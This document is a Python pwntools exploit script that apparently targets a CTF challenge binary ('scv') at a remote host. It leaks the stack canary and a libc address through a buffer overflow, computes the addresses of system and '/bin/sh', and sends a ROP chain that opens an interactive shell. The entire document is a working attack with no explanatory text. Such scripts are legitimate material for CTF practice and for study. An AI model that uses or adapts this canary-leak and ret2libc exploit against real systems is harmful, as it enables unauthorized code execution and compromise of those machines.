from pwn import *

if __name__ == '__main__':
#	s = process('./scv')
	s = remote('cykor.kr', 10002)

	print s.recvuntil(">>")
	s.sendline("1")
	print s.recvuntil(">>")

	payload = 'A'*(0xb0-8+1)

	s.send(payload)
	print s.recvuntil(">>")

	s.sendline("2")
	CANARY = "\x00"+s.recvuntil(">>").split('A'*(0xb0-8+1))[1][0:7]
	CANARY = u64(CANARY)

	s.sendline("1")
	print s.recvuntil(">>")
	s.send('A'*(0xb0 -8+16))
	print s.recvuntil(">>")
	
	s.sendline("2")
	tmp = s.recvuntil(">>")
	libc_main = tmp.split('A'*(0xb0-8+16))[1][0:6] + '\x00'*2
	libc_main = u64(libc_main)

	print 'Canary : ' + hex(CANARY)
	print 'libc_start_main ' + hex(libc_main)

	system = libc_main - 0x7fd69e8d2830 + 0x7fd69e8f7390
	binsh = libc_main - 0x7fd69e8d2830 + 0x7fd69ea3ed17
	print 'system : ' + hex(system)
	print 'binsh : ' + hex(binsh)
	
	poprdi_ret = 0x0000000000400ea3

	payload = 'A'*(0xB0-8)
	payload += p64(CANARY)
	payload += 'A'*8
	payload += p64(poprdi_ret)
	payload += p64(binsh)
	payload += p64(system)

	s.sendline("1")
        print s.recvuntil(">>")
        s.send(payload)

	s.sendline("3")
	s.recvuntil("...")
	s.interactive()
	s.close()
